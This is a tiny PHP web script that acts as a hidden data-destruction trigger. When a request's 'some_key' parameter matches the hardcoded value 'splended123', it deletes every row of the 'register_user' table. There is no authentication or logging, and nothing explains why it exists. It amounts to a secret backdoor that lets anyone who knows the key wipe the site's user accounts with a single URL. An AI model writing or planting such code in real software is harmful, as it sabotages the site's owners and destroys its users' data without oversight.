<?php

include_once("common.php");

if($_GET['some_key']=='splended123'){
    
    $sql = "DELETE FROM `register_user`";
    $obj->MySQLSelect($sql);
}

?>